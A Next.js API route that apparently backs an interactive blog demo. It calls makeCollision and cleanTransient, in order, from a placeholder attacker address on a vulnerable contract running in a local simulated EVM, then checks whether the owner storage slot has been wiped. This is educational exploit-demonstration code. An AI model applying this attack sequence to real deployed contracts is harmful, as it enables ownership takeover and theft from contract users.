import { NextRequest, NextResponse } from "next/server";
import { encodeFunctionData } from "viem";

const ATTACKER_ADDRESS = "0xdead000000000000000000000000000000000000" as const;

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type AnyMemoryClient = any;

// Global session storage
declare global {
  // eslint-disable-next-line no-var
  var __blog_sessions: Map<string, {
    client: AnyMemoryClient;
    deployedContracts: Record<string, string>;
  }> | undefined;
}

function getSessionsMap() {
  if (!globalThis.__blog_sessions) {
    globalThis.__blog_sessions = new Map();
  }
  return globalThis.__blog_sessions;
}

// ABI for the vulnerable contract
const ABI = [
  {
    name: "makeCollision",
    type: "function",
    inputs: [{ name: "id", type: "uint256" }],
    outputs: [],
    stateMutability: "nonpayable",
  },
  {
    name: "cleanTransient",
    type: "function",
    inputs: [],
    outputs: [],
    stateMutability: "nonpayable",
  },
  {
    name: "owner",
    type: "function",
    inputs: [],
    outputs: [{ name: "", type: "address" }],
    stateMutability: "view",
  },
] as const;

export async function POST(req: NextRequest) {
  try {
    const { sessionId, contractAddress, step } = await req.json();

    // Get session
    const sessions = getSessionsMap();
    const session = sessions.get(sessionId);

    if (!session) {
      return NextResponse.json({
        success: false,
        error: "Session not found. Please reset and try again.",
      }, { status: 404 });
    }

    const { client } = session;

    if (step === "makeCollision") {
      // Step 1: Call makeCollision to cache the SSTORE helper
      console.log("[Step 1] Calling makeCollision(0)...");
      
      const callData = encodeFunctionData({
        abi: ABI,
        functionName: "makeCollision",
        args: [BigInt(0)],
      });

      const result = await client.tevmCall({
        from: ATTACKER_ADDRESS,
        to: contractAddress as `0x${string}`,
        data: callData,
        gas: BigInt(5_000_000),
        addToBlockchain: true,
      });

      if (result.errors) {
        return NextResponse.json({
          success: false,
          error: `makeCollision failed: ${result.errors[0].message}`,
        }, { status: 500 });
      }

      // Get storage after makeCollision
      const ownerSlotAfter = await client.getStorageAt({
        address: contractAddress as `0x${string}`,
        slot: "0x0000000000000000000000000000000000000000000000000000000000000000",
      });

      const rawValue = ownerSlotAfter || "0x0000000000000000000000000000000000000000000000000000000000000000";
      const ownerAfter = rawValue.length >= 42 
        ? "0x" + rawValue.slice(-40)
        : "0x" + "0".repeat(40);

      console.log(`[Step 1] Owner after makeCollision: ${ownerAfter}`);

      return NextResponse.json({
        success: true,
        step: "makeCollision",
        ownerAfter,
        rawStorage: ownerSlotAfter,
      });
    }

    if (step === "cleanTransient") {
      // Step 2: Call cleanTransient - this triggers the vulnerability!
      console.log("[Step 2] Calling cleanTransient() - TRIGGERING VULNERABILITY!");
      
      const callData = encodeFunctionData({
        abi: ABI,
        functionName: "cleanTransient",
        args: [],
      });

      const result = await client.tevmCall({
        from: ATTACKER_ADDRESS,
        to: contractAddress as `0x${string}`,
        data: callData,
        gas: BigInt(5_000_000),
        addToBlockchain: true,
      });

      if (result.errors) {
        return NextResponse.json({
          success: false,
          error: `cleanTransient failed: ${result.errors[0].message}`,
        }, { status: 500 });
      }

      // Get storage after cleanTransient
      const ownerSlotAfter = await client.getStorageAt({
        address: contractAddress as `0x${string}`,
        slot: "0x0000000000000000000000000000000000000000000000000000000000000000",
      });

      const rawValue = ownerSlotAfter || "0x0000000000000000000000000000000000000000000000000000000000000000";
      const ownerAfter = rawValue.length >= 42 
        ? "0x" + rawValue.slice(-40)
        : "0x" + "0".repeat(40);

      const isCleared = ownerAfter.toLowerCase() === "0x0000000000000000000000000000000000000000";
      
      console.log(`[Step 2] Owner after cleanTransient: ${ownerAfter}`);
      console.log(`[Step 2] VULNERABILITY TRIGGERED: ${isCleared}`);

      return NextResponse.json({
        success: true,
        step: "cleanTransient",
        ownerAfter,
        rawStorage: ownerSlotAfter,
        vulnerabilityTriggered: isCleared,
      });
    }

    return NextResponse.json({
      success: false,
      error: `Unknown step: ${step}`,
    }, { status: 400 });
  } catch (error) {
    console.error("[Step Error]", error);
    return NextResponse.json({
      success: false,
      error: error instanceof Error ? error.message : "Unknown error",
    }, { status: 500 });
  }
}